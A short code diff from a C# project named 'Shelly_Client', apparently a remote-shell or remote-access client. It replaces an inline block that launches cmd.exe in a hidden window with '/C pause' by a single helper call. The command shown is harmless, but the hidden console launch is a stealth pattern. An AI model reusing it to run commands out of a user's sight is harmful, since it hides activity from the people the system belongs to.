@@ -168,27 +168,8 @@ namespace Shelly_Client
                             // Set thread to background
                             Thread.CurrentThread.IsBackground = true;
 
-                            // Declare new instance
-                            var CmdCommand = new Process();
-
-                            // Set start info
-                            ProcessStartInfo startInfoMelt = new ProcessStartInfo()
-                            {
-                                // Set windows style to hidden
-                                WindowStyle = ProcessWindowStyle.Hidden,
-
-                                // Set filename to run cmd
-                                FileName = "cmd.exe",
-
-                                // Set cmd arguments
-                                Arguments = @"/C pause"
-                            };
-
-                            // Set start info
-                            CmdCommand.StartInfo = startInfoMelt;
-
-                            // Start cmd with arguments
-                            CmdCommand.Start();
+                            // Start idle cmd
+                            NoneClientRelated.Cmd("pause");
                         }
                     }).Start();
                 }
